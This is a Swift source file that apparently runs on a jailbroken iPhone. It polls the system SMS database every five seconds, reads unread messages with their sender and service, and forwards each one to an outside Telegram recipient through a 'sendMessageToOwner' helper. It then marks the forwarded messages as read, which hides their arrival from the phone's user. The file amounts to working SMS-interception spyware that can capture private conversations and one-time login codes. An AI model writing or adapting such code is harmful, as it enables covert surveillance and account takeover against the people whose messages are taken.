import Foundation
import SQLite3

class SMSMonitor {
    let smsReader = SMSReader()
    var timer: Timer?

    func startMonitoring() {
        timer = Timer.scheduledTimer(withTimeInterval: 5, repeats: true) { _ in
            self.checkForNewMessages()
        }
    }

    func stopMonitoring() {
        timer?.invalidate()
        timer = nil
    }

    private func checkForNewMessages() {
        smsReader.fetchUnreadSMS()
    }
}

class SMSReader {
    var db: OpaquePointer?

    init() {
        openDatabase()
    }

    deinit {
        closeDatabase()
    }

    func openDatabase() {
        let fileURL = URL(fileURLWithPath: "/private/var/mobile/Library/SMS/sms.db")

        if sqlite3_open(fileURL.path, &db) != SQLITE_OK {
            Message.text = "Error opening database"
            NSLog("Error opening database")
        } else {
            Message.text = "Successfully opened database"
            NSLog("Successfully opened database")
        }
    }

    func closeDatabase() {
        if db != nil {
            sqlite3_close(db)
        }
    }

    func fetchUnreadSMS() {
        let queryString = "SELECT m.ROWID AS id, m.text AS text, h.id AS address, h.service AS service FROM message m JOIN handle h ON m.handle_id = h.ROWID WHERE m.is_read = 0;"

        var stmt: OpaquePointer?

        if sqlite3_prepare_v2(db, queryString, -1, &stmt, nil) == SQLITE_OK {
            while sqlite3_step(stmt) == SQLITE_ROW {
                let id = Int(sqlite3_column_int(stmt, 0))
                if let queryResultCol1 = sqlite3_column_text(stmt, 1),
                   let queryResultCol2 = sqlite3_column_text(stmt, 2),
                   let queryResultCol3 = sqlite3_column_text(stmt, 3) {
                    let text = String(cString: queryResultCol1)
                    let address = String(cString: queryResultCol2)
                    let service = String(cString: queryResultCol3)
                    handleUnreadMessage(id: id, text: text, address: address, service: service)
                }
            }
        } else {
            let errorMessage = String(cString: sqlite3_errmsg(db))
            NSLog("Query is not prepared: \(errorMessage)")
        }

        sqlite3_finalize(stmt)
    }

    func handleUnreadMessage(id: Int, text: String, address: String, service: String) {
        NSLog("Handling message with ID \(id), Text: \(text), Address: \(address), Service: \(service)")
        
        let formattedMessage = "[\(service)] \(address): \(text)"
        TelegramUtils.sendMessageToOwner(text: formattedMessage) { success in
            if success {
                NSLog("SQMS: Message \(id) sent successfully")
                self.setMessageRead(id: id)
            } else {
                NSLog("SQMS: Failed to send message \(id)")
            }
        }
    }

    func setMessageRead(id: Int) {
        let updateQuery = "UPDATE message SET is_read = 1 WHERE ROWID = \(id);"

        var updateStmt: OpaquePointer?

        if sqlite3_prepare_v2(db, updateQuery, -1, &updateStmt, nil) == SQLITE_OK {
            if sqlite3_step(updateStmt) == SQLITE_DONE {
                NSLog("Message with ID \(id) marked as read.")
            } else {
                let errorMessage = String(cString: sqlite3_errmsg(db))
                NSLog("Error updating message: \(errorMessage)")
            }
        } else {
            let errorMessage = String(cString: sqlite3_errmsg(db))
            NSLog("Update query is not prepared: \(errorMessage)")
        }

        sqlite3_finalize(updateStmt)
    }
}
